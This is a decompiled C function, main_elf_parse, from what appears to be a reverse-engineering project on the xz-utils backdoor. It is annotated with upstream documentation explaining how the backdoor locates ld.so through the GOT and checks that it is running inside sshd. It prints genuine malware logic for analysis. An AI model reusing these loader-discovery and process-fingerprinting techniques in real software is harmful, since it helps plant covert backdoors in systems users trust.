// /home/kali/xzre-ghidra/xzregh/103CE0_main_elf_parse.c
// Function: main_elf_parse @ 0x103CE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall main_elf_parse(main_elf_t * main_elf)
/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief Parses the main executable from the provided structure.
 *   As part of the process the arguments and environment is checked.
 *
 *   The main_elf_t::dynamic_linker_ehdr is set in backdoor_setup() by an interesting trick where the address of __tls_get_addr()
 *   is found via GOT in update_got_address(). Then a backwards search for the ELF header magic bytes from this address is
 *   performed to find the ld.so ELF header.
 *
 *   The function will succeed if the checks outlined in @ref process_is_sshd (invoked by this function) are successful.
 *
 *   @param main_elf The main executable to parse.
 *   @return BOOL TRUE if successful and all checks passed, or FALSE otherwise.
 *
 * Upstream implementation excerpt (xzre/xzre_code/main_elf_parse.c):
 *     BOOL main_elf_parse(main_elf_t *main_elf){
 *     	if(!elf_parse(
 *     		main_elf->dynamic_linker_ehdr,
 *     		main_elf->elf_handles->dynamic_linker
 *     	)){
 *     		return FALSE;
 *     	}
 *     	Elf64_Sym *libc_stack_end_sym;
 *     	if(!(libc_stack_end_sym = elf_symbol_get(
 *     		main_elf->elf_handles->dynamic_linker,
 *     		STR_libc_stack_end,
 *     		STR_GLIBC_2_2_5
 *     	))){
 *     		return FALSE;
 *     	}
 *     	elf_info_t *dynamic_linker = main_elf->elf_handles->dynamic_linker;
 *     	void **libc_stack_end_ptr = (void *)PTRADD(dynamic_linker->elfbase, libc_stack_end_sym->st_value);
 *     	if(!process_is_sshd(dynamic_linker, *libc_stack_end_ptr)){
 *     		return FALSE;
 *     	}
 *     	*main_elf->__libc_stack_end = *libc_stack_end_ptr;
 *     	return TRUE;
 *     }
 */

BOOL main_elf_parse(main_elf_t *main_elf)

{
  BOOL BVar1;
  Elf64_Sym *libc_stack_end_sym;
  uchar *puVar2;
  elf_info_t *dynamic_linker;
  
  BVar1 = elf_parse(main_elf->dynamic_linker_ehdr,main_elf->elf_handles->dynamic_linker);
  if ((BVar1 != 0) &&
     (libc_stack_end_sym =
           (Elf64_Sym *)
           elf_symbol_get(main_elf->elf_handles->dynamic_linker,STR_libc_stack_end,STR_GLIBC_2_2_5),
     libc_stack_end_sym != (Elf64_Sym *)0x0)) {
    dynamic_linker = main_elf->elf_handles->dynamic_linker;
    puVar2 = dynamic_linker->elfbase->e_ident + libc_stack_end_sym->st_value;
    BVar1 = process_is_sshd(dynamic_linker,*(u8 **)puVar2);
    if (BVar1 != 0) {
      *main_elf->__libc_stack_end = *(void **)puVar2;
      return 1;
    }
  }
  return 0;
}

